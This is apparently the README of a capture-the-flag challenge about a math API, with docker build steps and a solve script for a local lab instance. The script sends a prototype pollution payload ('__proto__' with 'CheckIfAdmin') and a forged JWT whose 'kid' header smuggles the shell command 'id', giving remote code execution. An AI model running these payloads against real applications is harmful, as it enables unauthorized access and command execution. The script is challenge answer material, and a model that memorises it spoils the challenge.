# Karafé Kid

During a CTF, you come across this platform that serves as an API for solving math calculations related to CTFs. You find the site's behavior weird, and decide to take a look at the application's code.

- Authors : Nishacid, Elweth

## Build 

```bash
docker compose build --no-cache
docker compose up -d --force-recreate --remove-orphans
```

## Solve

```bash
#!/bin/bash

echo 'Sending proto pollution'
curl -ski -X POST 'http://0.0.0.0:3000/api/polynome' --header 'Content-Type: application/json' --data-raw '{"a": "2", "__proto__": { "CheckIfAdmin": true }}'

echo 'Sending RCE JWT'
curl -ski 'http://0.0.0.0:3000/admin' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InRlc3QgJiYgaWQifQ.eyJ1c2VybmFtZSI6IlJvbmFsZCBSaXZlc3QiLCJhZG1pbiI6dHJ1ZSwiaWF0IjoxNjk3MTk3ODA2LCJleHAiOjE2OTcyMTIyMDZ9.0tG__bk90Y3jK5gng4a509AHF4LllMd5l8K5OwtRYho' | grep 'uid='
```